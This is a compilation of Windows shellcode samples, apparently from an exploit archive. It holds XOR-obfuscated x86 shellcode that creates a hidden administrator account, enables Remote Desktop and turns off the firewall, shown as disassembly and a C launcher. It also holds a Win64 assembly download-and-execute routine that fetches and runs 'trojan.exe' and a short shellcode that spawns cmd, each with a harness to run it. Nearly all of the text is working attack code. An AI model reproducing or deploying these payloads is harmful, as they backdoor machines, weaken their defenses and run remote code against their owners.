 2e8:   31 d1                   xor    %edx,%ecx
 2ea:   51                      push   %ecx
 2eb:   b9 24 7c 3b 36          mov    $0x363b7c24,%ecx
 2f0:   ba 61 31 67 75          mov    $0x75673161,%edx
 2f5:   31 d1                   xor    %edx,%ecx
 2f7:   51                      push   %ecx
 2f8:   b9 31 3d 3b 27          mov    $0x273b3d31,%ecx
 2fd:   ba 62 64 68 73          mov    $0x73686462,%edx
 302:   31 d1                   xor    %edx,%ecx
 304:   51                      push   %ecx
 305:   b9 7f 7d 3d 35          mov    $0x353d7d7f,%ecx
 30a:   ba 36 33 78 69          mov    $0x69783336,%edx
 30f:   31 d1                   xor    %edx,%ecx
 311:   51                      push   %ecx
 312:   b9 7c 13 0f 2f          mov    $0x2f0f137c,%ecx
 317:   ba 31 52 4c 67          mov    $0x674c5231,%edx
 31c:   31 d1                   xor    %edx,%ecx
 31e:   51                      push   %ecx
 31f:   b9 1b 08 35 2d          mov    $0x2d35081b,%ecx
 324:   ba 58 49 79 72          mov    $0x72794958,%edx
 329:   31 d1                   xor    %edx,%ecx
 32b:   51                      push   %ecx
 32c:   b9 74 3a 1e 21          mov    $0x211e3a74,%ecx
 331:   ba 2d 65 52 6e          mov    $0x6e52652d,%edx
 336:   31 d1                   xor    %edx,%ecx
 338:   51                      push   %ecx
 339:   b9 16 10 1f 17          mov    $0x171f1016,%ecx
 33e:   ba 34 58 54 52          mov    $0x52545834,%edx
 343:   31 d1                   xor    %edx,%ecx
 345:   51                      push   %ecx
 346:   b9 2f 27 0c 6e          mov    $0x6e0c272f,%ecx
 34b:   ba 4e 43 68 4e          mov    $0x4e68434e,%edx
 350:   31 d1                   xor    %edx,%ecx
 352:   51                      push   %ecx
 353:   b9 39 22 5e 50          mov    $0x505e2239,%ecx
 358:   ba 4b 47 39 70          mov    $0x7039474b,%edx
 35d:   31 d1                   xor    %edx,%ecx
 35f:   51                      push   %ecx
 360:   89 e0                   mov    %esp,%eax
 362:   bb 41 41 41 01          mov    $0x1414141,%ebx
 367:   c1 eb 08                shr    $0x8,%ebx
 36a:   c1 eb 08                shr    $0x8,%ebx
 36d:   c1 eb 08                shr    $0x8,%ebx
 370:   53                      push   %ebx
 371:   50                      push   %eax
 372:   bb dc 7a a8 23          mov    $0x23a87adc,%ebx
 377:   ba 4d 56 36 55          mov    $0x5536564d,%edx
 37c:   31 d3                   xor    %edx,%ebx
 37e:   ff d3                   call   *%ebx
 380:   31 c0                   xor    %eax,%eax
 382:   50                      push   %eax
 383:   b8 41 41 41 65          mov    $0x65414141,%eax
 388:   c1 e8 08                shr    $0x8,%eax
 38b:   c1 e8 08                shr    $0x8,%eax
 38e:   c1 e8 08                shr    $0x8,%eax
 391:   50                      push   %eax
 392:   b9 1e 53 39 3c          mov    $0x3c39531e,%ecx
 397:   ba 6d 32 5b 50          mov    $0x505b326d,%edx
 39c:   31 d1                   xor    %edx,%ecx
 39e:   51                      push   %ecx
 39f:   b9 04 66 2f 32          mov    $0x322f6604,%ecx
 3a4:   ba 61 46 4b 5b          mov    $0x5b4b4661,%edx
 3a9:   31 d1                   xor    %edx,%ecx
 3ab:   51                      push   %ecx
 3ac:   b9 19 1e 0d 11          mov    $0x110d1e19,%ecx
 3b1:   ba 69 73 62 75          mov    $0x75627369,%edx
 3b6:   31 d1                   xor    %edx,%ecx
 3b8:   51                      push   %ecx
 3b9:   b9 20 41 47 36          mov    $0x36474120,%ecx
 3be:   ba 45 35 67 59          mov    $0x59673545,%edx
 3c3:   31 d1                   xor    %edx,%ecx
 3c5:   51                      push   %ecx
 3c6:   b9 2b 05 64 2a          mov    $0x2a64052b,%ecx
 3cb:   ba 47 69 44 59          mov    $0x59446947,%edx
 3d0:   31 d1                   xor    %edx,%ecx
 3d2:   51                      push   %ecx
 3d3:   b9 10 3f 4f 22          mov    $0x224f3f10,%ecx
 3d8:   ba 62 5a 38 43          mov    $0x43385a62,%edx
 3dd:   31 d1                   xor    %edx,%ecx
 3df:   51                      push   %ecx
 3e0:   b9 2a 6f 2a 24          mov    $0x242a6f2a,%ecx
 3e5:   ba 42 4f 4c 4d          mov    $0x4d4c4f42,%edx
 3ea:   31 d1                   xor    %edx,%ecx
 3ec:   51                      push   %ecx
 3ed:   b9 29 09 1e 5e          mov    $0x5e1e0929,%ecx
 3f2:   ba 47 6c 6a 2d          mov    $0x2d6a6c47,%edx
 3f7:   31 d1                   xor    %edx,%ecx
 3f9:   51                      push   %ecx
 3fa:   89 e0                   mov    %esp,%eax
 3fc:   bb 41 41 41 01          mov    $0x1414141,%ebx
 401:   c1 eb 08                shr    $0x8,%ebx
 404:   c1 eb 08                shr    $0x8,%ebx
 407:   c1 eb 08                shr    $0x8,%ebx
 40a:   53                      push   %ebx
 40b:   50                      push   %eax
 40c:   bb dc 7a a8 23          mov    $0x23a87adc,%ebx
 411:   ba 4d 56 36 55          mov    $0x5536564d,%edx
 416:   31 d3                   xor    %edx,%ebx
 418:   ff d3                   call   *%ebx
 41a:   31 c0                   xor    %eax,%eax
 41c:   50                      push   %eax
 41d:   b8 41 41 41 6f          mov    $0x6f414141,%eax
 422:   c1 e8 08                shr    $0x8,%eax
 425:   c1 e8 08                shr    $0x8,%eax
 428:   c1 e8 08                shr    $0x8,%eax
 42b:   50                      push   %eax
 42c:   b9 72 2a 05 39          mov    $0x39052a72,%ecx
 431:   ba 52 4b 70 4d          mov    $0x4d704b52,%edx
 436:   31 d1                   xor    %edx,%ecx
 438:   51                      push   %ecx
 439:   b9 54 3a 05 52          mov    $0x52053a54,%ecx
 43e:   ba 35 48 71 6f          mov    $0x6f714835,%edx
 443:   31 d1                   xor    %edx,%ecx
 445:   51                      push   %ecx
 446:   b9 29 16 0a 47          mov    $0x470a1629,%ecx
 44b:   ba 4c 36 79 33          mov    $0x3379364c,%edx
 450:   31 d1                   xor    %edx,%ecx
 452:   51                      push   %ecx
 453:   b9 27 1b 5b 3e          mov    $0x3e5b1b27,%ecx
 458:   ba 55 6d 32 5d          mov    $0x5d326d55,%edx
 45d:   31 d1                   xor    %edx,%ecx
 45f:   51                      push   %ecx
 460:   b9 33 1a 3b 10          mov    $0x103b1a33,%ecx
 465:   ba 41 77 48 75          mov    $0x75487741,%edx
 46a:   31 d1                   xor    %edx,%ecx
 46c:   51                      push   %ecx
 46d:   b9 34 79 3a 12          mov    $0x123a7934,%ecx
 472:   ba 53 59 4e 77          mov    $0x774e5953,%edx
 477:   31 d1                   xor    %edx,%ecx
 479:   51                      push   %ecx
 47a:   b9 1d 5c 1e 28          mov    $0x281e5c1d,%ecx
 47f:   ba 72 32 78 41          mov    $0x41783272,%edx
 484:   31 d1                   xor    %edx,%ecx
 486:   51                      push   %ecx
 487:   b9 2a 4e 5a 28          mov    $0x285a4e2a,%ecx
 48c:   ba 59 2d 7a 4b          mov    $0x4b7a2d59,%edx
 491:   31 d1                   xor    %edx,%ecx
 493:   51                      push   %ecx
 494:   89 e0                   mov    %esp,%eax
 496:   bb 41 41 41 01          mov    $0x1414141,%ebx
 49b:   c1 eb 08                shr    $0x8,%ebx
 49e:   c1 eb 08                shr    $0x8,%ebx
 4a1:   c1 eb 08                shr    $0x8,%ebx
 4a4:   53                      push   %ebx
 4a5:   50                      push   %eax
 4a6:   bb dc 7a a8 23          mov    $0x23a87adc,%ebx
 4ab:   ba 4d 56 36 55          mov    $0x5536564d,%edx
 4b0:   31 d3                   xor    %edx,%ebx
 4b2:   ff d3                   call   *%ebx
 4b4:   bb 9b 4f d0 30          mov    $0x30d04f9b,%ebx
 4b9:   ba 63 36 46 46          mov    $0x46463663,%edx
 4be:   31 d3                   xor    %edx,%ebx
 4c0:   ff d3                   call   *%ebx
*/
 
#include <stdio.h>
#include <string.h>
 
int main(){
unsigned char shellcode[]= "\x31\xc0\x50\xb8\x41\x41\x41\x64\xc1\xe8\x08\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x6d\x76\x53\x52\xba\x4d\x59\x32\x36\x31\xd1\x51\xb9\x6e\x72\x61\x71\xba\x4e\x33\x2d\x38\x31\xd1\x51\xb9\x6c\x75\x78\x78\xba\x4c\x34\x34\x31\x31\xd1\x51\xb9\x46\x47\x57\x46\xba\x33\x34\x32\x34\x31\xd1\x51\xb9\x56\x50\x47\x64\xba\x38\x35\x33\x44\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xdc\x7a\xa8\x23\xba\x4d\x56\x36\x55\x31\xd3\xff\xd3\x31\xc0\x50\x68\x41\x41\x64\x64\x58\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x01\x41\x60\x32\xba\x48\x61\x4f\x53\x31\xd1\x51\xb9\x28\x47\x0d\x2f\xba\x5b\x67\x4c\x63\x31\xd1\x51\xb9\x03\x24\x36\x21\xba\x62\x50\x59\x53\x31\xd1\x51\xb9\x34\x41\x15\x18\xba\x5d\x32\x61\x6a\x31\xd1\x51\xb9\x0c\x05\x1b\x25\xba\x68\x68\x72\x4b\x31\xd1\x51\xb9\x2f\x27\x7b\x13\xba\x5a\x57\x5b\x52\x31\xd1\x51\xb9\x1c\x2c\x02\x3e\xba\x70\x4b\x70\x51\x31\xd1\x51\xb9\x3d\x2a\x32\x4c\xba\x51\x45\x51\x2d\x31\xd1\x51\xb9\x23\x5c\x1c\x19\xba\x4d\x39\x68\x39\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xdc\x7a\xa8\x23\xba\x4d\x56\x36\x55\x31\xd3\xff\xd3\x31\xc0\x50\x68\x41\x41\x64\x64\x58\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x02\x63\x6b\x35\xba\x4b\x43\x44\x54\x31\xd1\x51\xb9\x61\x55\x6c\x3d\xba\x43\x75\x2d\x71\x31\xd1\x51\xb9\x27\x3f\x3b\x1a\xba\x54\x5a\x49\x69\x31\xd1\x51\xb9\x25\x34\x12\x67\xba\x4a\x44\x32\x32\x31\xd1\x51\xb9\x0b\x02\x1f\x19\xba\x6e\x71\x74\x6d\x31\xd1\x51\xb9\x39\x3f\x7b\x15\xba\x4d\x5a\x5b\x51\x31\xd1\x51\xb9\x35\x15\x03\x2a\xba\x67\x70\x6e\x45\x31\xd1\x51\xb9\x3a\x17\x75\x46\xba\x6f\x47\x55\x64\x31\xd1\x51\xb9\x26\x35\x0b\x1e\xba\x6a\x72\x59\x51\x31\xd1\x51\xb9\x2a\x2a\x06\x2a\xba\x66\x65\x45\x6b\x31\xd1\x51\xb9\x1d\x20\x35\x5a\xba\x53\x65\x61\x7a\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xdc\x7a\xa8\x23\xba\x4d\x56\x36\x55\x31\xd3\xff\xd3\x31\xc0\x50\xb9\x09\x4c\x7c\x5e\xba\x38\x6c\x53\x38\x31\xd1\x51\xb9\x42\x4d\x39\x14\xba\x62\x62\x5d\x34\x31\xd1\x51\xb9\x7a\x24\x26\x75\xba\x2d\x6b\x74\x31\x31\xd1\x51\xb9\x1d\x30\x15\x28\xba\x58\x77\x4a\x6c\x31\xd1\x51\xb9\x7c\x2f\x57\x16\xba\x53\x5b\x77\x44\x31\xd1\x51\xb9\x42\x25\x2a\x66\xba\x2d\x4b\x59\x46\x31\xd1\x51\xb9\x28\x2f\x0c\x5a\xba\x4d\x4c\x78\x33\x31\xd1\x51\xb9\x20\x2b\x26\x26\xba\x63\x44\x48\x48\x31\xd1\x51\xb9\x08\x2b\x23\x67\xba\x66\x52\x77\x34\x31\xd1\x51\xb9\x49\x1c\x2e\x48\xba\x69\x7a\x6a\x2d\x31\xd1\x51\xb9\x67\x67\x1d\x37\xba\x45\x47\x32\x41\x31\xd1\x51\xb9\x03\x33\x0d\x3b\xba\x71\x45\x68\x49\x31\xd1\x51\xb9\x39\x6a\x3c\x2f\xba\x55\x4a\x6f\x4a\x31\xd1\x51\xb9\x37\x44\x1f\x2e\xba\x5a\x2d\x71\x4f\x31\xd1\x51\xb9\x34\x23\x23\x3b\xba\x68\x77\x46\x49\x31\xd1\x51\xb9\x07\x3a\x0a\x14\xba\x73\x48\x65\x78\x31\xd1\x51\xb9\x14\x2e\x58\x53\xba\x48\x6d\x37\x3d\x31\xd1\x51\xb9\x3e\x3d\x26\x32\xba\x52\x6e\x43\x46\x31\xd1\x51\xb9\x33\x3c\x35\x34\xba\x5d\x48\x47\x5b\x31\xd1\x51\xb9\x36\x0e\x07\x2b\xba\x58\x7a\x44\x44\x31\xd1\x51\xb9\x3c\x10\x0a\x37\xba\x49\x62\x78\x52\x31\xd1\x51\xb9\x24\x7c\x3b\x36\xba\x61\x31\x67\x75\x31\xd1\x51\xb9\x31\x3d\x3b\x27\xba\x62\x64\x68\x73\x31\xd1\x51\xb9\x7f\x7d\x3d\x35\xba\x36\x33\x78\x69\x31\xd1\x51\xb9\x7c\x13\x0f\x2f\xba\x31\x52\x4c\x67\x31\xd1\x51\xb9\x1b\x08\x35\x2d\xba\x58\x49\x79\x72\x31\xd1\x51\xb9\x74\x3a\x1e\x21\xba\x2d\x65\x52\x6e\x31\xd1\x51\xb9\x16\x10\x1f\x17\xba\x34\x58\x54\x52\x31\xd1\x51\xb9\x2f\x27\x0c\x6e\xba\x4e\x43\x68\x4e\x31\xd1\x51\xb9\x39\x22\x5e\x50\xba\x4b\x47\x39\x70\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xdc\x7a\xa8\x23\xba\x4d\x56\x36\x55\x31\xd3\xff\xd3\x31\xc0\x50\xb8\x41\x41\x41\x65\xc1\xe8\x08\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x1e\x53\x39\x3c\xba\x6d\x32\x5b\x50\x31\xd1\x51\xb9\x04\x66\x2f\x32\xba\x61\x46\x4b\x5b\x31\xd1\x51\xb9\x19\x1e\x0d\x11\xba\x69\x73\x62\x75\x31\xd1\x51\xb9\x20\x41\x47\x36\xba\x45\x35\x67\x59\x31\xd1\x51\xb9\x2b\x05\x64\x2a\xba\x47\x69\x44\x59\x31\xd1\x51\xb9\x10\x3f\x4f\x22\xba\x62\x5a\x38\x43\x31\xd1\x51\xb9\x2a\x6f\x2a\x24\xba\x42\x4f\x4c\x4d\x31\xd1\x51\xb9\x29\x09\x1e\x5e\xba\x47\x6c\x6a\x2d\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xdc\x7a\xa8\x23\xba\x4d\x56\x36\x55\x31\xd3\xff\xd3\x31\xc0\x50\xb8\x41\x41\x41\x6f\xc1\xe8\x08\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x72\x2a\x05\x39\xba\x52\x4b\x70\x4d\x31\xd1\x51\xb9\x54\x3a\x05\x52\xba\x35\x48\x71\x6f\x31\xd1\x51\xb9\x29\x16\x0a\x47\xba\x4c\x36\x79\x33\x31\xd1\x51\xb9\x27\x1b\x5b\x3e\xba\x55\x6d\x32\x5d\x31\xd1\x51\xb9\x33\x1a\x3b\x10\xba\x41\x77\x48\x75\x31\xd1\x51\xb9\x34\x79\x3a\x12\xba\x53\x59\x4e\x77\x31\xd1\x51\xb9\x1d\x5c\x1e\x28\xba\x72\x32\x78\x41\x31\xd1\x51\xb9\x2a\x4e\x5a\x28\xba\x59\x2d\x7a\x4b\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xdc\x7a\xa8\x23\xba\x4d\x56\x36\x55\x31\xd3\xff\xd3\xbb\x9b\x4f\xd0\x30\xba\x63\x36\x46\x46\x31\xd3\xff\xd3";
fprintf(stdout,"Length: %d\n\n",strlen(shellcode));
    (*(void(*)()) shellcode)();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

;
; dexec64.asm - 218+ bytes (unoptimised)
;
; Win64 asm code, download & execute file using URLDownloadToFileA moniker & WinExec
;
; tested on AMD64 running Windows x64 SP1
;
; there probably are errors in the code, but this is more of an experimental source if nothing else.
; send corrections or errors to: 'weiss' wyse101 [at] gmail [dot] com
; code is not optimised at all, doesn't contain null bytes, so is possibly suitable for testing exploits on win64
;
; one of the main stumbling blocks in coding x64 asm on windows is the alignment of the stack.
; it must be aligned by 16 bytes because windows uses 128-bit SSE2, otherwise the api call will fail.
;
; thanx:
;
; roy g biv/29a - http://www.29a.net/
; Feryno - http://feryno.host.sk
; Tomasz Grysztar - http://flatassembler.org
;
format PE64 console 4.0
entry entrypoint

section '.text' code readable writeable executable     ; assumed to be writeable when in memory, no NX obstruction!

                                           ; 1*8 is used rather than 0*8 because it uses null byte
LoadLibraryA         equ  rbp+1*8          ; using rbp is smaller than using ebp on 64-bit
WinExec              equ  rbp+2*8
URLDownloadToFileA   equ  rbp+3*8          ; must be rbp because of 64-bit URLMON base address

entrypoint:
   jmp get_eip
load_dta:
   pop  rax
   push rax
   lea  r15,[rax-(setup_stack-hashes)]
   inc  byte [rax-(setup_stack-url_end)]          ; nullify tail end of url
   inc  byte [rax-(setup_stack-fname_end)]        ; nullify end of filename
   inc  byte [rax-(setup_stack-url_mon_end)]      ; nullify end of URLMON
   ret                                            ; go!

hashes:
   dw  0bb86h         ; LoadLibraryA()     635bbb86
   dw  0a333h         ; WinExec()          208da333

   db  'URLMON',0ffh,0ffh
url_mon_end   =   $-2

   dw  05f92h         ; URLDownloadToFileA    c91e5f92
   dq  -1
fname:
   db  'trojan.exe',0ffh                        ; what to save as
fname_end  =   $-1

url:
   db  'http://localhost/trojan.exe',0ffh       ; where to download file from
url_end  =   $-1

get_eip:
   call  load_dta
setup_stack:
   add  rsp,-(4*8)    ; 3 api variables, + 1 for avoiding null :-|
   push  rsp
   pop  rbp           ; rbp = table of api
   mov  rdi,rbp       ; rdi points to table also
   stosq              ; doesn't really do anything.
   add  rsp,-(11*8)   ; reserve space for windows, when calling api

   push 60h           ; Hello, Ratter. 8-D
   pop rcx
   mov rax,[gs:rcx]   ; Peb
   mov rax,[rax+18h]  ; PebLdr
   mov rsi,[rax+30h]  ; Ldr.InInitializationOrderModuleList
   lodsq              ; skip ntdll.dll
   mov rbx,[rax+10h]  ; kernel32.dll base

   mov cl,2                     ; get 2 api first
get_apis_loop:
   mov  eax,dword[rbx+3ch]      ; MZ header size
   lea  rsi,[rbx+rax+78h]       ; export directory begins at 88h
   mov  eax,dword[rsi+10h]      ; extra instructions needed to avoid null bytes
   lea  rsi,[rbx+rax+1ch]

   lodsd
   lea  r9,[rax+rbx]
   lodsd
   lea  r10,[rax+rbx]
   lodsd
   lea  r11,[rax+rbx]
   xor  r12,r12
load_index:
   mov  esi,dword[r10+4*r12]
   add  rsi,rbx
   inc  r12
   xor  eax,eax
   cdq
hash_export:
   lodsb
   add  edx,eax
   rol  edx, 5
   dec  eax
   jns  hash_export
   ror  edx, 5
   cmp  dx,word [r15]            ; found api?
   jne  load_index

   movzx  edx,word [r11+2*r12-2]
   mov  eax,[r9+4*rdx]
   add  rax,rbx
   add  r15,2                  ; skip hash

   stosq                       ; save api address
   loop get_apis_loop

   push  r15                   ; push/pop to avoid null with mov
   pop  rcx
   call  qword[LoadLibraryA]

   xchg  rax,rbx
   add  r15,8                   ; skip URLMON, first time.
   push  1                      ; get 1 api from URLMON
   pop  rcx
   test  rbx,rbx                ; continue if not zero
   jne   get_apis_loop

   dec  ecx
   push  rbx
   sub  rsp,3*8                 ; needed to align stack
   xor  r9,r9
   mov  r8,r15
   lea  rdx,[r8+(url-fname)]
   call  qword[URLDownloadToFileA]

   push 1
   pop  rdx
   mov rcx,r15
   call  qword[WinExec]       ; WinExec("trojan.exe",SW_SHOWNORMAL??);

   ;jmp   $                   ; hang

   call qword[ExitProcess]    ; not required, testing only

; section below not required, simply for testing.
section '.idata' import data readable writeable

  dd 0,0,0,RVA kernel_name,RVA kernel_table
  dd 0,0,0,0,0

  kernel_table:
    ExitProcess dq RVA _ExitProcess
    dq 0

  kernel_name db 'KERNEL32.DLL',0

  _ExitProcess dw 0
    db 'ExitProcess',0

; July 2006 - (Ireland)




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

 /*
 | Title: Windows Seven x64 (cmd) Shellcode 61 Bytes
 | Type: Shellcode
 | Author: agix
 | Platform: win32
 | Info: Tested on Windows Seven Pro Fr, Ultimate En, Premium Home En
*/

#include <stdio.h>

char shellcode[] =

"\x31\xC9"                   //xor ecx,ecx
"\x64\x8B\x71\x30"           //mov esi,[fs:ecx+0x30]
"\x8B\x76\x0C"               //mov esi,[esi+0xc]
"\x8B\x76\x1C"               //mov esi,[esi+0x1c]
"\x8B\x36"                   //mov esi,[esi]
"\x8B\x06"                   //mov eax,[esi]
"\x8B\x68\x08"               //mov ebp,[eax+0x8]
"\xEB\x20"                   //jmp short 0x35
"\x5B"                       //pop ebx
"\x53"                       //push ebx
"\x55"                       //push ebp
"\x5B"                       //pop ebx
"\x81\xEB\x11\x11\x11\x11"   //sub ebx,0x11111111
"\x81\xC3\xDA\x3F\x1A\x11"   //add ebx,0x111a3fda (for seven X86 add ebx,0x1119f7a6)
"\xFF\xD3"                   //call ebx
"\x81\xC3\x11\x11\x11\x11"   //add ebx,0x11111111
"\x81\xEB\x8C\xCC\x18\x11"   //sub ebx,0x1118cc8c (for seven X86 sub ebx,0x1114ccd7)
"\xFF\xD3"                   //call ebx
"\xE8\xDB\xFF\xFF\xFF"       //call dword 0x15
//db "cmd"
"\x63\x6d\x64";


int main(int argc, char **argv) {
        int *ret;
        ret = (int *)&ret + 2;
        (*ret) = (int) shellcode;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
#Title: Obfuscated Shellcode Windows x86 [1218 Bytes] [Add Administrator User/Pass ALI/ALI & Add ALI to RDP Group & Enable RDP From Registery & STOP Firewall & Auto Start terminal service]
#length: 1218 bytes
#Date: 13 January 2015
#Author: Ali Razmjoo
#tested On: Windows 7 x86 ultimate

WinExec =>  0x7666e695
ExitProcess =>  0x76632acf
====================================
Execute :
net user ALI ALI /add
net localgroup Administrators ALI /add
NET LOCALGROUP "Remote Desktop Users" ALI /add  
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f 
netsh firewall set opmode disable
sc config termservice start= auto
====================================



Ali Razmjoo , ['Ali.Razmjoo1994@Gmail.Com','Ali@Z3r0D4y.Com']

Thanks to my friends , Dariush Nasirpour and Ehsan Nezami


C:\Users\Ali\Desktop>objdump -D shellcode.o

shellcode.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:   31 c0                   xor    %eax,%eax
   2:   50                      push   %eax
   3:   b8 41 41 41 64          mov    $0x64414141,%eax
   8:   c1 e8 08                shr    $0x8,%eax
   b:   c1 e8 08                shr    $0x8,%eax
   e:   c1 e8 08                shr    $0x8,%eax
  11:   50                      push   %eax
  12:   b9 6d 76 53 52          mov    $0x5253766d,%ecx
  17:   ba 4d 59 32 36          mov    $0x3632594d,%edx
  1c:   31 d1                   xor    %edx,%ecx
  1e:   51                      push   %ecx
  1f:   b9 6e 72 61 71          mov    $0x7161726e,%ecx
  24:   ba 4e 33 2d 38          mov    $0x382d334e,%edx
  29:   31 d1                   xor    %edx,%ecx
  2b:   51                      push   %ecx
  2c:   b9 6c 75 78 78          mov    $0x7878756c,%ecx
  31:   ba 4c 34 34 31          mov    $0x3134344c,%edx
  36:   31 d1                   xor    %edx,%ecx
  38:   51                      push   %ecx
  39:   b9 46 47 57 46          mov    $0x46574746,%ecx
  3e:   ba 33 34 32 34          mov    $0x34323433,%edx
  43:   31 d1                   xor    %edx,%ecx
  45:   51                      push   %ecx
  46:   b9 56 50 47 64          mov    $0x64475056,%ecx
  4b:   ba 38 35 33 44          mov    $0x44333538,%edx
  50:   31 d1                   xor    %edx,%ecx
  52:   51                      push   %ecx
  53:   89 e0                   mov    %esp,%eax
  55:   bb 41 41 41 01          mov    $0x1414141,%ebx
  5a:   c1 eb 08                shr    $0x8,%ebx
  5d:   c1 eb 08                shr    $0x8,%ebx
  60:   c1 eb 08                shr    $0x8,%ebx
  63:   53                      push   %ebx
  64:   50                      push   %eax
  65:   bb a6 b4 02 2f          mov    $0x2f02b4a6,%ebx
  6a:   ba 33 52 64 59          mov    $0x59645233,%edx
  6f:   31 d3                   xor    %edx,%ebx
  71:   ff d3                   call   *%ebx
  73:   31 c0                   xor    %eax,%eax
  75:   50                      push   %eax
  76:   68 41 41 64 64          push   $0x64644141
  7b:   58                      pop    %eax
  7c:   c1 e8 08                shr    $0x8,%eax
  7f:   c1 e8 08                shr    $0x8,%eax
  82:   50                      push   %eax
  83:   b9 01 41 60 32          mov    $0x32604101,%ecx
  88:   ba 48 61 4f 53          mov    $0x534f6148,%edx
  8d:   31 d1                   xor    %edx,%ecx
  8f:   51                      push   %ecx
  90:   b9 28 47 0d 2f          mov    $0x2f0d4728,%ecx
  95:   ba 5b 67 4c 63          mov    $0x634c675b,%edx
  9a:   31 d1                   xor    %edx,%ecx
  9c:   51                      push   %ecx
  9d:   b9 03 24 36 21          mov    $0x21362403,%ecx
  a2:   ba 62 50 59 53          mov    $0x53595062,%edx
  a7:   31 d1                   xor    %edx,%ecx
  a9:   51                      push   %ecx
  aa:   b9 34 41 15 18          mov    $0x18154134,%ecx
  af:   ba 5d 32 61 6a          mov    $0x6a61325d,%edx
  b4:   31 d1                   xor    %edx,%ecx
  b6:   51                      push   %ecx
  b7:   b9 0c 05 1b 25          mov    $0x251b050c,%ecx
  bc:   ba 68 68 72 4b          mov    $0x4b726868,%edx
  c1:   31 d1                   xor    %edx,%ecx
  c3:   51                      push   %ecx
  c4:   b9 2f 27 7b 13          mov    $0x137b272f,%ecx
  c9:   ba 5a 57 5b 52          mov    $0x525b575a,%edx
  ce:   31 d1                   xor    %edx,%ecx
  d0:   51                      push   %ecx
  d1:   b9 1c 2c 02 3e          mov    $0x3e022c1c,%ecx
  d6:   ba 70 4b 70 51          mov    $0x51704b70,%edx
  db:   31 d1                   xor    %edx,%ecx
  dd:   51                      push   %ecx
  de:   b9 3d 2a 32 4c          mov    $0x4c322a3d,%ecx
  e3:   ba 51 45 51 2d          mov    $0x2d514551,%edx
  e8:   31 d1                   xor    %edx,%ecx
  ea:   51                      push   %ecx
  eb:   b9 23 5c 1c 19          mov    $0x191c5c23,%ecx
  f0:   ba 4d 39 68 39          mov    $0x3968394d,%edx
  f5:   31 d1                   xor    %edx,%ecx
  f7:   51                      push   %ecx
  f8:   89 e0                   mov    %esp,%eax
  fa:   bb 41 41 41 01          mov    $0x1414141,%ebx
  ff:   c1 eb 08                shr    $0x8,%ebx
 102:   c1 eb 08                shr    $0x8,%ebx
 105:   c1 eb 08                shr    $0x8,%ebx
 108:   53                      push   %ebx
 109:   50                      push   %eax
 10a:   bb a6 b4 02 2f          mov    $0x2f02b4a6,%ebx
 10f:   ba 33 52 64 59          mov    $0x59645233,%edx
 114:   31 d3                   xor    %edx,%ebx
 116:   ff d3                   call   *%ebx
 118:   31 c0                   xor    %eax,%eax
 11a:   50                      push   %eax
 11b:   68 41 41 64 64          push   $0x64644141
 120:   58                      pop    %eax
 121:   c1 e8 08                shr    $0x8,%eax
 124:   c1 e8 08                shr    $0x8,%eax
 127:   50                      push   %eax
 128:   b9 02 63 6b 35          mov    $0x356b6302,%ecx
 12d:   ba 4b 43 44 54          mov    $0x5444434b,%edx
 132:   31 d1                   xor    %edx,%ecx
 134:   51                      push   %ecx
 135:   b9 61 55 6c 3d          mov    $0x3d6c5561,%ecx
 13a:   ba 43 75 2d 71          mov    $0x712d7543,%edx
 13f:   31 d1                   xor    %edx,%ecx
 141:   51                      push   %ecx
 142:   b9 27 3f 3b 1a          mov    $0x1a3b3f27,%ecx
 147:   ba 54 5a 49 69          mov    $0x69495a54,%edx
 14c:   31 d1                   xor    %edx,%ecx
 14e:   51                      push   %ecx
 14f:   b9 25 34 12 67          mov    $0x67123425,%ecx
 154:   ba 4a 44 32 32          mov    $0x3232444a,%edx
 159:   31 d1                   xor    %edx,%ecx
 15b:   51                      push   %ecx
 15c:   b9 0b 02 1f 19          mov    $0x191f020b,%ecx
 161:   ba 6e 71 74 6d          mov    $0x6d74716e,%edx
 166:   31 d1                   xor    %edx,%ecx
 168:   51                      push   %ecx
 169:   b9 39 3f 7b 15          mov    $0x157b3f39,%ecx
 16e:   ba 4d 5a 5b 51          mov    $0x515b5a4d,%edx
 173:   31 d1                   xor    %edx,%ecx
 175:   51                      push   %ecx
 176:   b9 35 15 03 2a          mov    $0x2a031535,%ecx
 17b:   ba 67 70 6e 45          mov    $0x456e7067,%edx
 180:   31 d1                   xor    %edx,%ecx
 182:   51                      push   %ecx
 183:   b9 3a 17 75 46          mov    $0x4675173a,%ecx
 188:   ba 6f 47 55 64          mov    $0x6455476f,%edx
 18d:   31 d1                   xor    %edx,%ecx
 18f:   51                      push   %ecx
 190:   b9 26 35 0b 1e          mov    $0x1e0b3526,%ecx
 195:   ba 6a 72 59 51          mov    $0x5159726a,%edx
 19a:   31 d1                   xor    %edx,%ecx
 19c:   51                      push   %ecx
 19d:   b9 2a 2a 06 2a          mov    $0x2a062a2a,%ecx
 1a2:   ba 66 65 45 6b          mov    $0x6b456566,%edx
 1a7:   31 d1                   xor    %edx,%ecx
